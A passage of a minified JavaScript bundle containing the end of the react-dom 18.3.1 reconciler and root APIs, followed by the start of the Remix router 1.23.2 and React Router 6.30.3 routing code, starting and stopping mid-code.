a=rn(t,Ke.current);Xs(t,r),a=eu(null,t,s,e,a,r);var i=tu();return t.flags|=1,typeof a=="object"&&a!==null&&typeof a.render=="function"&&a.$$typeof===void 0?(t.tag=1,t.memoizedState=null,t.updateQueue=null,at(s)?(i=!0,bi(t)):i=!1,t.memoizedState=a.state!==null&&a.state!==void 0?a.state:null,Jc(t),a.updater=Qi,t.stateNode=a,a._reactInternals=t,Bo(t,s,e,r),t=qo(null,t,s,!0,i,r)):(t.tag=0,ge&&i&&Bc(t),Qe(null,t,a,r),t=t.child),t;case 16:s=t.elementType;e:{switch(ii(e,t),e=t.pendingProps,a=s._init,s=a(s._payload),t.type=s,a=t.tag=Px(s),e=At(s,e),a){case 0:t=Vo(null,t,s,e,r);break e;case 1:t=Nd(null,t,s,e,r);break e;case 11:t=kd(null,t,s,e,r);break e;case 14:t=_d(null,t,s,At(s.type,e),r);break e}throw Error(A(306,s,""))}return t;case 0:return s=t.type,a=t.pendingProps,a=t.elementType===s?a:At(s,a),Vo(e,t,s,a,r);case 1:return s=t.type,a=t.pendingProps,a=t.elementType===s?a:At(s,a),Nd(e,t,s,a,r);case 3:e:{if(cm(t),e===null)throw Error(A(387));s=t.pendingProps,i=t.memoizedState,a=i.element,zf(e,t),Si(t,s,null,r);var l=t.memoizedState;if(s=l.element,i.isDehydrated)if(i={element:s,isDehydrated:!1,cache:l.cache,pendingSuspenseBoundaries:l.pendingSuspenseBoundaries,transitions:l.transitions},t.updateQueue.baseState=i,t.memoizedState=i,t.flags&256){a=ln(Error(A(423)),t),t=Sd(e,t,s,r,a);break e}else if(s!==a){a=ln(Error(A(424)),t),t=Sd(e,t,s,r,a);break e}else for(ht=Pr(t.stateNode.containerInfo.firstChild),mt=t,ge=!0,Lt=null,r=If(t,null,s,r),t.child=r;r;)r.flags=r.flags&-3|4096,r=r.sibling;else{if(sn(),s===a){t=dr(e,t,r);break e}Qe(e,t,s,r)}t=t.child}return t;case 5:return Lf(t),e===null&&Do(t),s=t.type,a=t.pendingProps,i=e!==null?e.memoizedProps:null,l=a.children,Io(s,a)?l=null:i!==null&&Io(s,i)&&(t.flags|=32),om(e,t),Qe(e,t,l,r),t.child;case 6:return e===null&&Do(t),null;case 13:return um(e,t,r);case 4:return Yc(t,t.stateNode.containerInfo),s=t.pendingProps,e===null?t.child=nn(t,null,s,r):Qe(e,t,s,r),t.child;case 11:return s=t.type,a=t.pendingProps,a=t.elementType===s?a:At(s,a),kd(e,t,s,a,r);case 7:return Qe(e,t,t.pendingProps,r),t.child;case 8:return Qe(e,t,t.pendingProps.children,r),t.child;case 12:return Qe(e,t,t.pendingProps.children,r),t.child;case 10:e:{if(s=t.type._context,a=t.pendingProps,i=t.memoizedProps,l=a.value,he(_i,s._currentValue),s._currentValue=l,i!==null)if(Ft(i.value,l)){if(i.children===a.children&&!nt.current){t=dr(e,t,r);break e}}else for(i=t.child,i!==null&&(i.return=t);i!==null;){var o=i.dependencies;if(o!==null){l=i.child;for(var c=o.firstContext;c!==null;){if(c.context===s){if(i.tag===1){c=ar(-1,r&-r),c.tag=2;var u=i.updateQueue;if(u!==null){u=u.shared;var h=u.pending;h===null?c.next=c:(c.next=h.next,h.next=c),u.pending=c}}i.lanes|=r,c=i.alternate,c!==null&&(c.lanes|=r),Mo(i.return,r,t),o.lanes|=r;break}c=c.next}}else if(i.tag===10)l=i.type===t.type?null:i.child;else if(i.tag===18){if(l=i.return,l===null)throw Error(A(341));l.lanes|=r,o=l.alternate,o!==null&&(o.lanes|=r),Mo(l,r,t),l=i.sibling}else l=i.child;if(l!==null)l.return=i;else for(l=i;l!==null;){if(l===t){l=null;break}if(i=l.sibling,i!==null){i.return=l.return,l=i;break}l=l.return}i=l}Qe(e,t,a.children,r),t=t.child}return t;case 9:return a=t.type,s=t.pendingProps.children,Xs(t,r),a=_t(a),s=s(a),t.flags|=1,Qe(e,t,s,r),t.child;case 14:return s=t.type,a=At(s,t.pendingProps),a=At(s.type,a),_d(e,t,s,a,r);case 15:return im(e,t,t.type,t.pendingProps,r);case 17:return s=t.type,a=t.pendingProps,a=t.elementType===s?a:At(s,a),ii(e,t),t.tag=1,at(s)?(e=!0,bi(t)):e=!1,Xs(t,r),sm(t,s,a),Bo(t,s,a,r),qo(null,t,s,!0,e,r);case 19:return dm(e,t,r);case 22:return lm(e,t,r)}throw Error(A(156,t.tag))};function Em(e,t){return Zh(e,t)}function Rx(e,t,r,s){this.tag=e,this.key=r,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=t,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=s,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function jt(e,t,r,s){return new Rx(e,t,r,s)}function du(e){return e=e.prototype,!(!e||!e.isReactComponent)}function Px(e){if(typeof e=="function")return du(e)?1:0;if(e!=null){if(e=e.$$typeof,e===Rc)return 11;if(e===Pc)return 14}return 2}function $r(e,t){var r=e.alternate;return r===null?(r=jt(e.tag,t,e.key,e.mode),r.elementType=e.elementType,r.type=e.type,r.stateNode=e.stateNode,r.alternate=e,e.alternate=r):(r.pendingProps=t,r.type=e.type,r.flags=0,r.subtreeFlags=0,r.deletions=null),r.flags=e.flags&14680064,r.childLanes=e.childLanes,r.lanes=e.lanes,r.child=e.child,r.memoizedProps=e.memoizedProps,r.memoizedState=e.memoizedState,r.updateQueue=e.updateQueue,t=e.dependencies,r.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext},r.sibling=e.sibling,r.index=e.index,r.ref=e.ref,r}function ci(e,t,r,s,a,i){var l=2;if(s=e,typeof e=="function")du(e)&&(l=1);else if(typeof e=="string")l=5;else e:switch(e){case zs:return xs(r.children,a,i,t);case Tc:l=8,a|=8;break;case ho:return e=jt(12,r,t,a|2),e.elementType=ho,e.lanes=i,e;case fo:return e=jt(13,r,t,a),e.elementType=fo,e.lanes=i,e;case mo:return e=jt(19,r,t,a),e.elementType=mo,e.lanes=i,e;case zh:return el(r,a,i,t);default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case Ih:l=10;break e;case $h:l=9;break e;case Rc:l=11;break e;case Pc:l=14;break e;case yr:l=16,s=null;break e}throw Error(A(130,e==null?e:typeof e,""))}return t=jt(l,r,t,a),t.elementType=e,t.type=s,t.lanes=i,t}function xs(e,t,r,s){return e=jt(7,e,s,t),e.lanes=r,e}function el(e,t,r,s){return e=jt(22,e,s,t),e.elementType=zh,e.lanes=r,e.stateNode={isHidden:!1},e}function Ql(e,t,r){return e=jt(6,e,null,t),e.lanes=r,e}function Xl(e,t,r){return t=jt(4,e.children!==null?e.children:[],e.key,t),t.lanes=r,t.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},t}function Ax(e,t,r,s,a){this.tag=t,this.containerInfo=e,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=Al(0),this.expirationTimes=Al(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=Al(0),this.identifierPrefix=s,this.onRecoverableError=a,this.mutableSourceEagerHydrationData=null}function hu(e,t,r,s,a,i,l,o,c){return e=new Ax(e,t,r,o,c),t===1?(t=1,i===!0&&(t|=8)):t=0,i=jt(3,null,null,t),e.current=i,i.stateNode=e,i.memoizedState={element:s,isDehydrated:r,cache:null,transitions:null,pendingSuspenseBoundaries:null},Jc(i),e}function Ox(e,t,r){var s=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:$s,key:s==null?null:""+s,children:e,containerInfo:t,implementation:r}}function Cm(e){if(!e)return Dr;e=e._reactInternals;e:{if(ks(e)!==e||e.tag!==1)throw Error(A(170));var t=e;do{switch(t.tag){case 3:t=t.stateNode.context;break e;case 1:if(at(t.type)){t=t.stateNode.__reactInternalMemoizedMergedChildContext;break e}}t=t.return}while(t!==null);throw Error(A(171))}if(e.tag===1){var r=e.type;if(at(r))return Cf(e,r,t)}return t}function Tm(e,t,r,s,a,i,l,o,c){return e=hu(r,s,!0,e,a,i,l,o,c),e.context=Cm(null),r=e.current,s=Xe(),a=Ir(r),i=ar(s,a),i.callback=t??null,Ar(r,i,a),e.current.lanes=a,ka(e,a,s),it(e,s),e}function tl(e,t,r,s){var a=t.current,i=Xe(),l=Ir(a);return r=Cm(r),t.context===null?t.context=r:t.pendingContext=r,t=ar(i,l),t.payload={element:e},s=s===void 0?null:s,s!==null&&(t.callback=s),e=Ar(a,t,l),e!==null&&(Mt(e,a,l,i),si(e,a,l)),l}function Ii(e){if(e=e.current,!e.child)return null;switch(e.child.tag){case 5:return e.child.stateNode;default:return e.child.stateNode}}function zd(e,t){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var r=e.retryLane;e.retryLane=r!==0&&r<t?r:t}}function fu(e,t){zd(e,t),(e=e.alternate)&&zd(e,t)}function Ix(){return null}var Rm=typeof reportError=="function"?reportError:function(e){console.error(e)};function mu(e){this._internalRoot=e}rl.prototype.render=mu.prototype.render=function(e){var t=this._internalRoot;if(t===null)throw Error(A(409));tl(e,t,null,null)};rl.prototype.unmount=mu.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var t=e.containerInfo;bs(function(){tl(null,e,null,null)}),t[cr]=null}};function rl(e){this._internalRoot=e}rl.prototype.unstable_scheduleHydration=function(e){if(e){var t=lf();e={blockedOn:null,target:e,priority:t};for(var r=0;r<br.length&&t!==0&&t<br[r].priority;r++);br.splice(r,0,e),r===0&&cf(e)}};function pu(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function sl(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11&&(e.nodeType!==8||e.nodeValue!==" react-mount-point-unstable "))}function Ld(){}function $x(e,t,r,s,a){if(a){if(typeof s=="function"){var i=s;s=function(){var u=Ii(l);i.call(u)}}var l=Tm(t,s,e,0,null,!1,!1,"",Ld);return e._reactRootContainer=l,e[cr]=l.current,na(e.nodeType===8?e.parentNode:e),bs(),l}for(;a=e.lastChild;)e.removeChild(a);if(typeof s=="function"){var o=s;s=function(){var u=Ii(c);o.call(u)}}var c=hu(e,0,!1,null,null,!1,!1,"",Ld);return e._reactRootContainer=c,e[cr]=c.current,na(e.nodeType===8?e.parentNode:e),bs(function(){tl(t,c,r,s)}),c}function nl(e,t,r,s,a){var i=r._reactRootContainer;if(i){var l=i;if(typeof a=="function"){var o=a;a=function(){var c=Ii(l);o.call(c)}}tl(t,l,e,a)}else l=$x(r,t,e,a,s);return Ii(l)}nf=function(e){switch(e.tag){case 3:var t=e.stateNode;if(t.current.memoizedState.isDehydrated){var r=zn(t.pendingLanes);r!==0&&(Ic(t,r|1),it(t,Se()),!(ee&6)&&(on=Se()+500,Wr()))}break;case 13:bs(function(){var s=ur(e,1);if(s!==null){var a=Xe();Mt(s,e,1,a)}}),fu(e,1)}};$c=function(e){if(e.tag===13){var t=ur(e,134217728);if(t!==null){var r=Xe();Mt(t,e,134217728,r)}fu(e,134217728)}};af=function(e){if(e.tag===13){var t=Ir(e),r=ur(e,t);if(r!==null){var s=Xe();Mt(r,e,t,s)}fu(e,t)}};lf=function(){return ae};of=function(e,t){var r=ae;try{return ae=e,t()}finally{ae=r}};_o=function(e,t,r){switch(t){case"input":if(go(e,r),t=r.name,r.type==="radio"&&t!=null){for(r=e;r.parentNode;)r=r.parentNode;for(r=r.querySelectorAll("input[name="+JSON.stringify(""+t)+'][type="radio"]'),t=0;t<r.length;t++){var s=r[t];if(s!==e&&s.form===e.form){var a=Gi(s);if(!a)throw Error(A(90));Uh(s),go(s,a)}}}break;case"textarea":Mh(e,r);break;case"select":t=r.value,t!=null&&Gs(e,!!r.multiple,t,!1)}};Kh=ou;Gh=bs;var zx={usingClientEntryPoint:!1,Events:[Na,Ms,Gi,qh,Hh,ou]},An={findFiberByHostInstance:ds,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},Lx={bundleType:An.bundleType,version:An.version,rendererPackageName:An.rendererPackageName,rendererConfig:An.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:fr.ReactCurrentDispatcher,findHostInstanceByFiber:function(e){return e=Qh(e),e===null?null:e.stateNode},findFiberByHostInstance:An.findFiberByHostInstance||Ix,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var Va=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!Va.isDisabled&&Va.supportsFiber)try{Vi=Va.inject(Lx),Kt=Va}catch{}}xt.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=zx;xt.createPortal=function(e,t){var r=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!pu(t))throw Error(A(200));return Ox(e,t,null,r)};xt.createRoot=function(e,t){if(!pu(e))throw Error(A(299));var r=!1,s="",a=Rm;return t!=null&&(t.unstable_strictMode===!0&&(r=!0),t.identifierPrefix!==void 0&&(s=t.identifierPrefix),t.onRecoverableError!==void 0&&(a=t.onRecoverableError)),t=hu(e,1,!1,null,null,r,!1,s,a),e[cr]=t.current,na(e.nodeType===8?e.parentNode:e),new mu(t)};xt.findDOMNode=function(e){if(e==null)return null;if(e.nodeType===1)return e;var t=e._reactInternals;if(t===void 0)throw typeof e.render=="function"?Error(A(188)):(e=Object.keys(e).join(","),Error(A(268,e)));return e=Qh(t),e=e===null?null:e.stateNode,e};xt.flushSync=function(e){return bs(e)};xt.hydrate=function(e,t,r){if(!sl(t))throw Error(A(200));return nl(null,e,t,!0,r)};xt.hydrateRoot=function(e,t,r){if(!pu(e))throw Error(A(405));var s=r!=null&&r.hydratedSources||null,a=!1,i="",l=Rm;if(r!=null&&(r.unstable_strictMode===!0&&(a=!0),r.identifierPrefix!==void 0&&(i=r.identifierPrefix),r.onRecoverableError!==void 0&&(l=r.onRecoverableError)),t=Tm(t,null,e,1,r??null,a,!1,i,l),e[cr]=t.current,na(e),s)for(e=0;e<s.length;e++)r=s[e],a=r._getVersion,a=a(r._source),t.mutableSourceEagerHydrationData==null?t.mutableSourceEagerHydrationData=[r,a]:t.mutableSourceEagerHydrationData.push(r,a);return new rl(t)};xt.render=function(e,t,r){if(!sl(t))throw Error(A(200));return nl(null,e,t,!1,r)};xt.unmountComponentAtNode=function(e){if(!sl(e))throw Error(A(40));return e._reactRootContainer?(bs(function(){nl(null,null,e,!1,function(){e._reactRootContainer=null,e[cr]=null})}),!0):!1};xt.unstable_batchedUpdates=ou;xt.unstable_renderSubtreeIntoContainer=function(e,t,r,s){if(!sl(r))throw Error(A(200));if(e==null||e._reactInternals===void 0)throw Error(A(38));return nl(e,t,r,!1,s)};xt.version="18.3.1-next-f1338f8080-20240426";function Pm(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(Pm)}catch(e){console.error(e)}}Pm(),Rh.exports=xt;var Ux=Rh.exports,Ud=Ux;co.createRoot=Ud.createRoot,co.hydrateRoot=Ud.hydrateRoot;/**
 * @remix-run/router v1.23.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function fa(){return fa=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var r=arguments[t];for(var s in r)Object.prototype.hasOwnProperty.call(r,s)&&(e[s]=r[s])}return e},fa.apply(this,arguments)}var Sr;(function(e){e.Pop="POP",e.Push="PUSH",e.Replace="REPLACE"})(Sr||(Sr={}));const Dd="popstate";function Dx(e){e===void 0&&(e={});function t(s,a){let{pathname:i,search:l,hash:o}=s.location;return sc("",{pathname:i,search:l,hash:o},a.state&&a.state.usr||null,a.state&&a.state.key||"default")}function r(s,a){return typeof a=="string"?a:$i(a)}return Fx(t,r,null,e)}function be(e,t){if(e===!1||e===null||typeof e>"u")throw new Error(t)}function xu(e,t){if(!e){typeof console<"u"&&console.warn(t);try{throw new Error(t)}catch{}}}function Mx(){return Math.random().toString(36).substr(2,8)}function Md(e,t){return{usr:e.state,key:e.key,idx:t}}function sc(e,t,r,s){return r===void 0&&(r=null),fa({pathname:typeof e=="string"?e:e.pathname,search:"",hash:""},typeof t=="string"?pn(t):t,{state:r,key:t&&t.key||s||Mx()})}function $i(e){let{pathname:t="/",search:r="",hash:s=""}=e;return r&&r!=="?"&&(t+=r.charAt(0)==="?"?r:"?"+r),s&&s!=="#"&&(t+=s.charAt(0)==="#"?s:"#"+s),t}function pn(e){let t={};if(e){let r=e.indexOf("#");r>=0&&(t.hash=e.substr(r),e=e.substr(0,r));let s=e.indexOf("?");s>=0&&(t.search=e.substr(s),e=e.substr(0,s)),e&&(t.pathname=e)}return t}function Fx(e,t,r,s){s===void 0&&(s={});let{window:a=document.defaultView,v5Compat:i=!1}=s,l=a.history,o=Sr.Pop,c=null,u=h();u==null&&(u=0,l.replaceState(fa({},l.state,{idx:u}),""));function h(){return(l.state||{idx:null}).idx}function p(){o=Sr.Pop;let j=h(),y=j==null?null:j-u;u=j,c&&c({action:o,location:w.location,delta:y})}function x(j,y){o=Sr.Push;let m=sc(w.location,j,y);u=h()+1;let g=Md(m,u),k=w.createHref(m);try{l.pushState(g,"",k)}catch(C){if(C instanceof DOMException&&C.name==="DataCloneError")throw C;a.location.assign(k)}i&&c&&c({action:o,location:w.location,delta:1})}function v(j,y){o=Sr.Replace;let m=sc(w.location,j,y);u=h();let g=Md(m,u),k=w.createHref(m);l.replaceState(g,"",k),i&&c&&c({action:o,location:w.location,delta:0})}function f(j){let y=a.location.origin!=="null"?a.location.origin:a.location.href,m=typeof j=="string"?j:$i(j);return m=m.replace(/ $/,"%20"),be(y,"No window.location.(origin|href) available to create URL for href: "+m),new URL(m,y)}let w={get action(){return o},get location(){return e(a,l)},listen(j){if(c)throw new Error("A history only accepts one active listener");return a.addEventListener(Dd,p),c=j,()=>{a.removeEventListener(Dd,p),c=null}},createHref(j){return t(a,j)},createURL:f,encodeLocation(j){let y=f(j);return{pathname:y.pathname,search:y.search,hash:y.hash}},push:x,replace:v,go(j){return l.go(j)}};return w}var Fd;(function(e){e.data="data",e.deferred="deferred",e.redirect="redirect",e.error="error"})(Fd||(Fd={}));function Bx(e,t,r){return r===void 0&&(r="/"),Wx(e,t,r)}function Wx(e,t,r,s){let a=typeof t=="string"?pn(t):t,i=cn(a.pathname||"/",r);if(i==null)return null;let l=Am(e);Vx(l);let o=null;for(let c=0;o==null&&c<l.length;++c){let u=tg(i);o=Zx(l[c],u)}return o}function Am(e,t,r,s){t===void 0&&(t=[]),r===void 0&&(r=[]),s===void 0&&(s="");let a=(i,l,o)=>{let c={relativePath:o===void 0?i.path||"":o,caseSensitive:i.caseSensitive===!0,childrenIndex:l,route:i};c.relativePath.startsWith("/")&&(be(c.relativePath.startsWith(s),'Absolute route path "'+c.relativePath+'" nested under path '+('"'+s+'" is not valid. An absolute child route path ')+"must start with the combined path of all its parent routes."),c.relativePath=c.relativePath.slice(s.length));let u=zr([s,c.relativePath]),h=r.concat(c);i.children&&i.children.length>0&&(be(i.index!==!0,"Index routes must not have child routes. Please remove "+('all child routes from route path "'+u+'".')),Am(i.children,t,h,u)),!(i.path==null&&!i.index)&&t.push({path:u,score:Qx(u,i.index),routesMeta:h})};return e.forEach((i,l)=>{var o;if(i.path===""||!((o=i.path)!=null&&o.includes("?")))a(i,l);else for(let c of Om(i.path))a(i,l,c)}),t}function Om(e){let t=e.split("/");if(t.length===0)return[];let[r,...s]=t,a=r.endsWith("?"),i=r.replace(/\?$/,"");if(s.length===0)return a?[i,""]:[i];let l=Om(s.join("/")),o=[];return o.push(...l.map(c=>c===""?i:[i,c].join("/"))),a&&o.push(...l),o.map(c=>e.startsWith("/")&&c===""?"/":c)}function Vx(e){e.sort((t,r)=>t.score!==r.score?r.score-t.score:Xx(t.routesMeta.map(s=>s.childrenIndex),r.routesMeta.map(s=>s.childrenIndex)))}const qx=/^:[\w-]+$/,Hx=3,Kx=2,Gx=1,Jx=10,Yx=-2,Bd=e=>e==="*";function Qx(e,t){let r=e.split("/"),s=r.length;return r.some(Bd)&&(s+=Yx),t&&(s+=Kx),r.filter(a=>!Bd(a)).reduce((a,i)=>a+(qx.test(i)?Hx:i===""?Gx:Jx),s)}function Xx(e,t){return e.length===t.length&&e.slice(0,-1).every((s,a)=>s===t[a])?e[e.length-1]-t[t.length-1]:0}function Zx(e,t,r){let{routesMeta:s}=e,a={},i="/",l=[];for(let o=0;o<s.length;++o){let c=s[o],u=o===s.length-1,h=i==="/"?t:t.slice(i.length)||"/",p=nc({path:c.relativePath,caseSensitive:c.caseSensitive,end:u},h),x=c.route;if(!p)return null;Object.assign(a,p.params),l.push({params:a,pathname:zr([i,p.pathname]),pathnameBase:ig(zr([i,p.pathnameBase])),route:x}),p.pathnameBase!=="/"&&(i=zr([i,p.pathnameBase]))}return l}function nc(e,t){typeof e=="string"&&(e={path:e,caseSensitive:!1,end:!0});let[r,s]=eg(e.path,e.caseSensitive,e.end),a=t.match(r);if(!a)return null;let i=a[0],l=i.replace(/(.)\/+$/,"$1"),o=a.slice(1);return{params:s.reduce((u,h,p)=>{let{paramName:x,isOptional:v}=h;if(x==="*"){let w=o[p]||"";l=i.slice(0,i.length-w.length).replace(/(.)\/+$/,"$1")}const f=o[p];return v&&!f?u[x]=void 0:u[x]=(f||"").replace(/%2F/g,"/"),u},{}),pathname:i,pathnameBase:l,pattern:e}}function eg(e,t,r){t===void 0&&(t=!1),r===void 0&&(r=!0),xu(e==="*"||!e.endsWith("*")||e.endsWith("/*"),'Route path "'+e+'" will be treated as if it were '+('"'+e.replace(/\*$/,"/*")+'" because the `*` character must ')+"always follow a `/` in the pattern. To get rid of this warning, "+('please change the route path to "'+e.replace(/\*$/,"/*")+'".'));let s=[],a="^"+e.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(l,o,c)=>(s.push({paramName:o,isOptional:c!=null}),c?"/?([^\\/]+)?":"/([^\\/]+)"));return e.endsWith("*")?(s.push({paramName:"*"}),a+=e==="*"||e==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):r?a+="\\/*$":e!==""&&e!=="/"&&(a+="(?:(?=\\/|$))"),[new RegExp(a,t?void 0:"i"),s]}function tg(e){try{return e.split("/").map(t=>decodeURIComponent(t).replace(/\//g,"%2F")).join("/")}catch(t){return xu(!1,'The URL path "'+e+'" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent '+("encoding ("+t+").")),e}}function cn(e,t){if(t==="/")return e;if(!e.toLowerCase().startsWith(t.toLowerCase()))return null;let r=t.endsWith("/")?t.length-1:t.length,s=e.charAt(r);return s&&s!=="/"?null:e.slice(r)||"/"}const rg=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,sg=e=>rg.test(e);function ng(e,t){t===void 0&&(t="/");let{pathname:r,search:s="",hash:a=""}=typeof e=="string"?pn(e):e,i;if(r)if(sg(r))i=r;else{if(r.includes("//")){let l=r;r=r.replace(/\/\/+/g,"/"),xu(!1,"Pathnames cannot have embedded double slashes - normalizing "+(l+" -> "+r))}r.startsWith("/")?i=Wd(r.substring(1),"/"):i=Wd(r,t)}else i=t;return{pathname:i,search:lg(s),hash:og(a)}}function Wd(e,t){let r=t.replace(/\/+$/,"").split("/");return e.split("/").forEach(a=>{a===".."?r.length>1&&r.pop():a!=="."&&r.push(a)}),r.length>1?r.join("/"):"/"}function Zl(e,t,r,s){return"Cannot include a '"+e+"' character in a manually specified "+("`to."+t+"` field ["+JSON.stringify(s)+"].  Please separate it out to the ")+("`to."+r+"` field. Alternatively you may provide the full path as ")+'a string in <Link to="..."> and the router will parse it for you.'}function ag(e){return e.filter((t,r)=>r===0||t.route.path&&t.route.path.length>0)}function gu(e,t){let r=ag(e);return t?r.map((s,a)=>a===r.length-1?s.pathname:s.pathnameBase):r.map(s=>s.pathnameBase)}function yu(e,t,r,s){s===void 0&&(s=!1);let a;typeof e=="string"?a=pn(e):(a=fa({},e),be(!a.pathname||!a.pathname.includes("?"),Zl("?","pathname","search",a)),be(!a.pathname||!a.pathname.includes("#"),Zl("#","pathname","hash",a)),be(!a.search||!a.search.includes("#"),Zl("#","search","hash",a)));let i=e===""||a.pathname==="",l=i?"/":a.pathname,o;if(l==null)o=r;else{let p=t.length-1;if(!s&&l.startsWith("..")){let x=l.split("/");for(;x[0]==="..";)x.shift(),p-=1;a.pathname=x.join("/")}o=p>=0?t[p]:"/"}let c=ng(a,o),u=l&&l!=="/"&&l.endsWith("/"),h=(i||l===".")&&r.endsWith("/");return!c.pathname.endsWith("/")&&(u||h)&&(c.pathname+="/"),c}const zr=e=>e.join("/").replace(/\/\/+/g,"/"),ig=e=>e.replace(/\/+$/,"").replace(/^\/*/,"/"),lg=e=>!e||e==="?"?"":e.startsWith("?")?e:"?"+e,og=e=>!e||e==="#"?"":e.startsWith("#")?e:"#"+e;function cg(e){return e!=null&&typeof e.status=="number"&&typeof e.statusText=="string"&&typeof e.internal=="boolean"&&"data"in e}const Im=["post","put","patch","delete"];new Set(Im);const ug=["get",...Im];new Set(ug);/**
 * React Router v6.30.3
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function ma(){return ma=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var r=arguments[t];for(var s in r)Object.prototype.hasOwnProperty.call(r,s)&&(e[s]=r[s])}return e},ma.apply(this,arguments)}const al=b.createContext(null),$m=b.createContext(null),mr=b.createContext(null),il=b.createContext(null),pr=b.createContext({outlet:null,matches:[],isDataRoute:!1}),zm=b.createContext(null);function dg(e,t){let{relative:r}=t===void 0?{}:t;xn()||be(!1);let{basename:s,navigator:a}=b.useContext(mr),{hash:i,pathname:l,search:o}=ll(e,{relative:r}),c=l;return s!=="/"&&(c=l==="/"?s:zr([s,l])),a.createHref({pathname:c,search:o,hash:i})}function xn(){return b.useContext(il)!=null}function _s(){return xn()||be(!1),b.useContext(il).location}function Lm(e){b.useContext(mr).static||b.useLayoutEffect(e)}function St(){let{isDataRoute:e}=b.useContext(pr);return e?Ng():hg()}function hg(){xn()||be(!1);let e=b.useContext(al),{basename:t,future:r,navigator:s}=b.useContext(mr),{matches:a}=b.useContext(pr),{pathname:i}=_s(),l=JSON.stringify(gu(a,r.v7_relativeSplatPath)),o=b.useRef(!1);return Lm(()=>{o.current=!0}),b.useCallback(function(u,h){if(h===void 0&&(h={}),!o.current)return;if(typeof u=="number"){s.go(u);return}let p=yu(u,JSON.parse(l),i,h.relative==="path");e==null&&t!=="/"&&(p.pathname=p.pathname==="/"?t:zr([t,p.pathname])),(h.replace?s.replace:s.push)(p,h.state,h)},[t,s,l,i,e])}function fg(){let{matches:e}=b.useContext(pr),t=e[e.length-1];return t?t.params:{}}function ll(e,t){let{relative:r}=t===void 0?{}:t,{future:s}=b.useContext(mr),{matches:a}=b.useContext(pr),{pathname:i}=_s(),l=JSON.stringify(gu(a,s.v7_relativeSplatPath));return b.useMemo(()=>yu(e,JSON.parse(l),i,r==="path"),[e,l,i,r])}function mg(e,t){return pg(e,t)}function pg(e,t,r,s){xn()||be(!1);let{navigator:a}=b.useContext(mr),{matches:i}=b.useContext(pr),l=i[i.length-1],o=l?l.params:{};l&&l.pathname;let c=l?l.pathnameBase:"/";l&&l.route;let u=_s(),h;if(t){var p;let j=typeof t=="string"?pn(t):t;c==="/"||(p=j.pathname)!=null&&p.startsWith(c)||be(!1),h=j}else h=u;let x=h.pathname||"/",v=x;if(c!=="/"){let j=c.replace(/^\//,"").split("/");v="/"+x.replace(/^\//,"").split("/").slice(j.length).join("/")}let f=Bx(e,{pathname:v}),w=wg(f&&f.map(j=>Object.assign({},j,{params:Object.assign({},o,j.params),pathname:zr([c,a.encodeLocation?a.encodeLocation(j.pathname).pathname:j.pathname]),pathnameBase:j.pathnameBase==="/"?c:zr([c,a.encodeLocation?a.encodeLocation(j.pathnameBase).pathname:j.pathnameBase])})),i,r,s);return t&&w?b.createElement(il.Provider,{value:{location:ma({pathname:"/",search:"",hash:"",state:null,key:"default"},h),navigationType:Sr.Pop}},w):w}function xg(){let e=_g(),t=cg(e)?e.status+" "+e.statusText:e instanceof Error?e.message:JSON.stringify(e),r=e instanceof Error?e.stack:null,a={padding:"0.5rem",backgroundColor:"rgba(200,200,200, 0.5)"};return b.createElement(b.Fragment,null,b.createElement("h2",null,"Unexpected Application Error!"),b.createElement("h3",{style:{fontStyle:"italic"}},t),r?b.createElement("pre",{style:a},r):null,null)}const gg=b.createElement(xg,null);class yg extends b.Component{constructor(t){super(t),this.state={location:t.location,revalidation:t.revalidation,error:t.error}}static getDerivedStateFromError(t){return{error:t}}static getDerivedStateFromProps(t,r){return r.location!==t.location||r.revalidation!=="idle"&&t.revalidation==="idle"?{error:t.error,location:t.location,revalidation:t.revalidation}:{error:t.error!==void 